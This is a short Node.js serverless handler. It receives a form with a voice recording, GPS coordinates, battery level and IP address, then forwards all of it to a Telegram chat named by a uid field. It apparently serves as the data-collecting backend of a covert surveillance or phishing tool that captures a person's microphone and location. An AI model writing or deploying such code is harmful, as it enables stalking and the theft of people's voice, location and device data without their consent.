const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);
const formidable = require('formidable');
const fs = require('fs');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const form = new formidable.IncomingForm({ keepExtensions: true });
  
  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send('Form parsing error');

    const uid = fields.uid;
    const battery = fields.battery;
    const ip = fields.ip;
    const location = JSON.parse(fields.location || '{}');
    const voicePath = files.voice?.filepath;

    if (!uid || !voicePath) return res.status(400).send('Missing UID or voice');

    const caption = `🎤 New Voice Received

📍 Location: ${location.latitude || "N/A"}, ${location.longitude || "N/A"}
🔋 Battery: ${battery || "?"}%
🌐 IP: ${ip || "?"}

🆔 UID: ${uid}`;

    try {
      await bot.telegram.sendAudio(uid, { source: fs.createReadStream(voicePath) }, { caption });
      res.status(200).send('✅ Voice sent');
    } catch (e) {
      console.error(e);
      res.status(500).send('❌ Error sending voice');
    }
  });
}; 
